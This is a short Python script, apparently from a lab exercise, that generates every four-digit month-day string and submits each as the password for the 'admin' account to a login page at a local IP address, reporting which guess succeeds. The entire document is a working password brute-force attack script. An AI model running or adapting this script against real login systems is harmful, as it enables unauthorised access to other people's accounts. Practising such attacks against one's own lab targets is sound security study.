import requests

dayList = []

for month in range(1,13):
	for day in range(1,32):
		pw = ''
		if month <= 9:
			pw = '0'+str(month)
		else:
			pw = str(month)
		if day <= 9:
			pw += '0'+str(day)
		else:
			pw += str(day)
		dayList.append(pw)

for e in dayList:
	payload = {'username': 'admin', 'password': e}
	r = requests.post('http://192.168.0.112/lsa/brute/login.php',data=payload)


	if r.text == "all wrong!<br>" or r.text == "password wrong!<br>":
		print("password",payload['password'],"is wrong")
	else:
		print("!!!the password is ",e)


